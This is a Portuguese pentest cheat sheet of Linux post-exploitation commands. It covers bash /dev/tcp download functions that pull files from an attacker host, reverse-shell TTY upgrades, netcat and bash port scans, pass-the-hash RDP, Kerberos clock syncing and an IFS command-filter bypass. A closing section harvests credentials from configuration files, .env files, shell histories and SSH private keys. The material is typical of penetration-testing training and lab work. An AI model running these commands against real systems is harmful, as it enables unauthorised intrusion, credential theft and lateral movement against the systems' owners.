# Comandos Linux

## Índice

- [Transferência de Arquivos](#transferência-de-arquivos)
  - [Servidores Python](#servidores-python)
  - [Netcat](#netcat)
  - [Servidor SMB com Impacket](#servidor-smb-com-impacket)
  - [wget/curl apenas com Bash](#wgetcurl-apenas-com-bash)
  - [SCP](#scp)
- [Upgrade de Shell](#upgrade-de-shell)
- [Rede](#rede)
  - [SSH](#ssh)
  - [Varredura de Portas](#varredura-de-portas)
  - [SMB](#smb)
  - [NFS](#nfs)
  - [RDP](#rdp)
- [Sincronização de Hora e Data](#sincronização-de-hora-e-data)
- [Ambiente e Compilação](#ambiente-e-compilação)
  - [Variáveis de Ambiente](#variáveis-de-ambiente)
  - [Cross-Compile com gcc](#cross-compile-com-gcc)
  - [virtualenv](#virtualenv)
- [Utilitários](#utilitários)
  - [curl](#curl)
  - [iconv](#iconv)
  - [vi](#vi)
  - [Tmux](#tmux)
- [Caça a Arquivos](#caça-a-arquivos)

---

## Transferência de Arquivos

### Verificação Rápida (One-liner)

```shell
# Servidor rápido para transferência de arquivos
python3 -m http.server 80 & curl http://$lhost/$file -o /tmp/$file
```

### Servidores Python

```shell
# Servidor HTTP simples
sudo python -m SimpleHTTPServer 80
sudo python3 -m http.server 80

# Servidor PHP
sudo php -S 127.0.0.1:80

# Servidor com upload
python3 -m venv venv && source venv/bin/activate && pip install uploadserver && python -m uploadserver 80
```

### Netcat

```shell
# Receptor
nc -lnvp $lport > $file

# Emissor
nc $rhost $rport < $file
```

### Servidor SMB com Impacket

```shell
sudo impacket-smbserver $share ./
sudo impacket-smbserver $share . -smb2support
impacket-smbserver kali . -username kali -password kali -smb2support

# Copiar do cliente Windows
copy * \\$lhost\$share
```

### wget/curl apenas com Bash

> Útil quando wget/curl não estão disponíveis no alvo

#### Versão wget

```bash
function __wget() {
    : ${DEBUG:=0}
    local URL=$1
    local tag="Connection: close"
    local mark=0

    if [ -z "${URL}" ]; then
        printf "Usage: %s \"URL\" [e.g.: %s http://www.google.com/]" \
               "${FUNCNAME[0]}" "${FUNCNAME[0]}"
        return 1;
    fi
    read proto server path <<<$(echo ${URL//// })
    DOC=/${path// //}
    HOST=${server//:*}
    PORT=${server//*:}
    [[ x"${HOST}" == x"${PORT}" ]] && PORT=80
    [[ $DEBUG -eq 1 ]] && echo "HOST=$HOST"
    [[ $DEBUG -eq 1 ]] && echo "PORT=$PORT"
    [[ $DEBUG -eq 1 ]] && echo "DOC =$DOC"

    exec 3<>/dev/tcp/${HOST}/$PORT
    echo -en "GET ${DOC} HTTP/1.1\r\nHost: ${HOST}\r\n${tag}\r\n\r\n" >&3
    while read line; do
        [[ $mark -eq 1 ]] && echo $line
        if [[ "${line}" =~ "${tag}" ]]; then
            mark=1
        fi
    done <&3
    exec 3>&-
}

__wget http://$lhost/$file
```

#### Versão curl

```bash
function __curl() {
  read proto server path <<<$(echo ${1//// })
  DOC=/${path// //}
  HOST=${server//:*}
  PORT=${server//*:}
  [[ x"${HOST}" == x"${PORT}" ]] && PORT=80

  exec 3<>/dev/tcp/${HOST}/$PORT
  echo -en "GET ${DOC} HTTP/1.0\r\nHost: ${HOST}\r\n\r\n" >&3
  (while read line; do
   [[ "$line" == $'\r' ]] && break
  done && cat) <&3
  exec 3>&-
}

__curl http://$lhost/$file > $output_file
```

### SCP

```shell
scp $file $user@$rhost:/path/to/destination
scp $user@$rhost:/path/to/file ./
scp -r $folder $user@$rhost:/path/to/destination
```

---

## Upgrade de Shell

### Python PTY

```shell
python -c 'import pty;pty.spawn("/bin/bash")'
python3 -c 'import pty;pty.spawn("/bin/bash")'
```

### Upgrade Completo para TTY

```shell
# Após obter shell inicial
python3 -c 'import pty;pty.spawn("/bin/bash")'
# Pressione Ctrl+Z para colocar em background
stty raw -echo
fg
# Pressione Enter duas vezes
export TERM=xterm
```

### Alternativa com tamanho stty

```shell
# Coloque em background com Ctrl+Z
stty -a                    # Anote linhas e colunas
stty raw -echo;fg
# Pressione Enter duas vezes
stty rows 37 cols 123
export TERM=xterm-256color
bash
```

### Método Script

```shell
script -q /dev/null -c bash
/usr/bin/script -qc /bin/bash /dev/null
```

### One-liner

```shell
stty raw -echo; fg; ls; export SHELL=/bin/bash; export TERM=screen; stty rows 38 columns 116; reset;
```

### Corrigindo Efeito Escada

```shell
env reset
# ou
stty onlcr
```

---

## Rede

### SSH

#### Usando Algoritmos Obsoletos

```shell
ssh $user@$rhost -oKexAlgorithms=+diffie-hellman-group1-sha1
```

#### Corrigindo Chave Privada SSH

```shell
dos2unix id_rsa
vim --clean id_rsa
chmod 600 id_rsa

# One-liner
dos2unix id_rsa; vim --clean -c 'wq' id_rsa; chmod 600 id_rsa
```

### Varredura de Portas

> Varredura básica de portas com netcat ou bash

```shell
# Varredura com Netcat
for p in {1..65535}; do nc -vn $rhost $p -w 1 -z & done 2> scan_results.txt

# Varredura apenas com Bash
export ip=$rhost; for port in $(seq 1 65535); do timeout 0.01 bash -c "</dev/tcp/$ip/$port && echo The port $port is open || echo The Port $port is closed > /dev/null" 2>/dev/null || echo Connection Timeout > /dev/null; done
```

### SMB

```shell
# Montar compartilhamento SMB
mount.cifs //$rhost/$share /mnt/remote

# Guestmount
guestmount --add '/$mountpoint/$directory' --inspector --ro /mnt/$mount -v

# Comandos smbclient
smbclient -L \\\\$rhost\\ -N
smbclient -L //$rhost/ -N
smbclient -L //$rhost// -U $user%$password
smbclient //$rhost/$share
smbclient //$rhost/$share -U $user
smbclient --no-pass //$rhost/$share

# Baixar múltiplos arquivos
mask ""
recurse ON
prompt OFF
mget *
```

### NFS

```shell
/usr/sbin/showmount -e $rhost
sudo showmount -e $rhost
sudo mount -t nfs -o vers=4,nolock $rhost:/$folder /mnt/$folder
```

### RDP

```shell
xfreerdp3 /v:$rhost /u:$user /p:$password /cert-ignore
xfreerdp3 /v:$rhost /u:$user /p:$password /d:$domain /cert-ignore
xfreerdp3 /v:$rhost /u:$user /p:$password +dynamic-resolution +clipboard
xfreerdp3 /v:$rhost /u:$user /d:$domain /pth:'$hash' +dynamic-resolution +clipboard
rdesktop $rhost
```

---

## Sincronização de Hora e Data

> Importante para ataques Kerberos

### Obter Hora do Servidor

```shell
sudo nmap -sU -p 123 --script "ntp-info" $rhost
```

### Desabilitar Sincronização Automática

```shell
sudo systemctl stop systemd-timesyncd
sudo systemctl disable --now chronyd
sudo /etc/init.d/virtualbox-guest-utils stop
```

### Opções de Sincronização

```shell
# net time
sudo net time -c $rhost
sudo net time set -S $rhost

# ntpdate
sudo ntpdate $rhost
sudo ntpdate -s $rhost
sudo ntpdate -b -u $rhost

# rdate
sudo rdate -n $rhost
sudo rdate -s $rhost

# timedatectl
sudo timedatectl set-timezone UTC
sudo timedatectl set-time 15:58:30
sudo timedatectl set-time '2015-11-20 16:14:50'
```

### Manter Sincronizado (loop)

```shell
while [ 1 ]; do sudo ntpdate $rhost; done
```

---

## Ambiente e Compilação

### Variáveis de Ambiente

```shell
export PATH=`pwd`:$PATH
```

### Cross-Compile com gcc

```shell
# Estático 32-bit
gcc --static -m32 -Wl,--hash-style=both exploit.c -o exploit

# Cross-compile para Windows
i686-w64-mingw32-gcc -o main32.exe main.c
x86_64-w64-mingw32-gcc -o main64.exe main.c
```

### virtualenv

```shell
# Python 3
sudo apt-get install virtualenv
python3 -m virtualenv venv
. venv/bin/activate

# Python 2.7
virtualenv -p python2.7 venv
. venv/bin/activate
```

---

## Utilitários

### curl

```shell
curl -v http://$domain                                                    # saída verbosa
curl -X POST http://$domain                                               # método POST
curl -X PUT http://$domain                                                # método PUT
curl --path-as-is http://$domain/../../../../../../etc/passwd             # tratar /../ na URL
curl --proxy http://127.0.0.1:8080 http://$domain                         # usar proxy
curl -F myFile=@$file http://$rhost                                       # upload de arquivo
curl${IFS}$lhost/$file                                                    # bypass com IFS
```

### iconv

> Útil para codificar comandos para PowerShell

```shell
echo "$command" | iconv -t UTF-16LE | base64 -w 0
echo "$command" | iconv -f UTF-8 -t UTF-16LE | base64 -w0
iconv -f ASCII -t UTF-16LE $file.txt | base64 | tr -d "\n"
```

### vi

```shell
:w !sudo tee %    # salvar arquivo com privilégios elevados sem sair
```

### Tmux

#### Navegação

```text
Ctrl+b + w        # mostrar janelas
Ctrl+b + "        # dividir horizontalmente
Ctrl+b + %        # dividir verticalmente
Ctrl+b + ,        # renomear janela
Ctrl+b + {        # girar painel
Ctrl+b + }        # girar painel
Ctrl+b + space    # alternar layout do painel
```

#### Copiar e Colar (modo vi)

```text
:setw -g mode-keys vi
Ctrl+b + [        # entrar no modo de cópia
space             # iniciar seleção
enter             # copiar seleção
Ctrl+b + ]        # colar
```

#### Busca

```text
Ctrl+b + [        # entrar no modo de cópia
Ctrl + /          # buscar (modo vi)
n                 # próxima ocorrência
Shift + n         # ocorrência anterior
```

#### Logging

```text
Ctrl+b então Shift+P    # iniciar/parar logging

# Salvar saída
Ctrl+b + :
capture-pane -S -
Ctrl+b + :
save-buffer $file.txt
```

---

## Caça a Arquivos

> Buscar arquivos sensíveis em sistemas Linux

### Buscar Senhas

```shell
# Buscar arquivos contendo senha
grep -rniE 'password|passwd|pwd|secret|credential' /etc /home /var/www 2>/dev/null | head -50

# Buscar em tipos específicos de arquivo
find / -type f \( -name "*.txt" -o -name "*.cfg" -o -name "*.conf" -o -name "*.ini" \) -exec grep -li "password" {} \; 2>/dev/null

# Buscar no histórico do shell
cat /home/*/.bash_history 2>/dev/null | grep -iE 'password|passwd|mysql|ssh|scp'
```

### Encontrar Arquivos Interessantes

```shell
# Encontrar arquivos SUID/SGID
find / -perm -4000 -type f 2>/dev/null
find / -perm -2000 -type f 2>/dev/null

# Encontrar arquivos graváveis
find / -writable -type f 2>/dev/null | grep -v proc

# Encontrar arquivos do usuário atual
find / -user $(whoami) -type f 2>/dev/null

# Encontrar arquivos modificados recentemente
find / -type f -mtime -7 2>/dev/null | head -50

# Encontrar arquivos com capabilities
getcap -r / 2>/dev/null
```

### Locais Comuns de Arquivos Sensíveis

```shell
# Credenciais de banco de dados
cat /var/www/*/wp-config.php 2>/dev/null
cat /var/www/*/.env 2>/dev/null
cat /var/www/*/config/*.php 2>/dev/null

# Chaves SSH
find / -name "id_rsa" -o -name "id_dsa" -o -name "*.pem" 2>/dev/null
cat /home/*/.ssh/id_rsa 2>/dev/null
cat /root/.ssh/id_rsa 2>/dev/null

# Tarefas cron
cat /etc/crontab /etc/cron.d/* /var/spool/cron/crontabs/* 2>/dev/null

# Arquivos de histórico
cat /home/*/.bash_history /root/.bash_history 2>/dev/null
```

### One-liners Rápidos de Caça a Arquivos

```shell
# Busca completa de arquivos sensíveis
find / -type f \( -name "*.conf" -o -name "*.config" -o -name "*.php" -o -name "*.txt" \) 2>/dev/null | xargs grep -l "password\|passwd\|secret" 2>/dev/null | head -20

# Encontrar arquivos de backup
find / -type f \( -name "*.bak" -o -name "*.backup" -o -name "*.old" -o -name "*~" \) 2>/dev/null

# Encontrar arquivos de banco de dados
find / -type f \( -name "*.sql" -o -name "*.db" -o -name "*.sqlite" \) 2>/dev/null
```

---

## Veja Também

- **[Comandos Windows](Windows-command.md)** - Comandos de sistema Windows e evasão de defesas
- **[Reverse Shell](Reverse-Shell.md)** - Payloads de shell para todas as plataformas
- **[Escalação de Privilégios Linux](../4.Privilege-Escalation/4.2.Privilege-Escalation-Linux.md)** - Técnicas de privesc no Linux
